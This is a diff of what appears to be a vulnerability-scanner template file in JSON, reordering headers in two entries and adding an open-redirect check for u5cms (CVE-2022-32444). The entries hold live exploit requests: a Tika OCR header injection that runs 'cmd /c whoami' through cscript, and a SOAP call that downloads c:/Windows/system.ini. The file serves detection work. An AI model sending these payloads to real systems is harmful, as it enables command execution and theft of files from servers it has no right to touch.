@@ -6371,11 +6371,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -11306,9 +11306,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -18804,6 +18804,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/resources//../WEB-INF/web.xml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-32444",
+      "info": {
+        "name": "u5cms v8.3.5 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/loginsave.php?u=http://interact.sh"
           ]
         }
       ]
